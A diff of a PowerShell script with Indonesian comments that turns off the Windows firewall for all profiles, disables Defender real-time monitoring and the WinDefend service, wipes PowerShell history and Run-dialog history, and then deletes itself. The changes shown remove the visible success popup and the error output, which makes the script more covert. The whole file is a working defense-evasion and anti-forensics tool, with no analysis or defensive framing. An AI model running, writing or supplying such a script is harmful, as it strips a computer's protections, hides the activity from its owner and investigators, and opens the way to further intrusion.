@@ -1,24 +1,27 @@
 # Matikan Firewall
 netsh advfirewall set allprofiles state off
 
-# Nonaktifkan Realtime Protection
+# Nonaktifkan Real-time Protection
 try {
     Set-MpPreference -DisableRealtimeMonitoring $true
-} catch {
-    Write-Output "Set-MpPreference gagal: $_"
-}
+} catch {}
 
-# Stop dan disable service Windows Defender
+# Stop & disable Windows Defender service
 sc.exe stop WinDefend
 sc.exe config WinDefend start= disabled
-
-# Notifikasi popup
-Add-Type -AssemblyName System.Windows.Forms
-[System.Windows.Forms.MessageBox]::Show("✅ Script berhasil dijalankan!", "haha", 'OK', 'Information')
 
 # Bersihkan jejak PowerShell
 Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 Clear-History
 
-# Optional: Bersihkan Run history (semua!)
+# Hapus Run history
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -ErrorAction SilentlyContinue
+
+# Delay sejenak
+Start-Sleep -Seconds 2
+
+# Hapus diri sendiri (kalau dijalankan sebagai file)
+$scriptPath = $MyInvocation.MyCommand.Path
+if (Test-Path $scriptPath) {
+    cmd /c "timeout 3 & del `"$scriptPath`""
+}
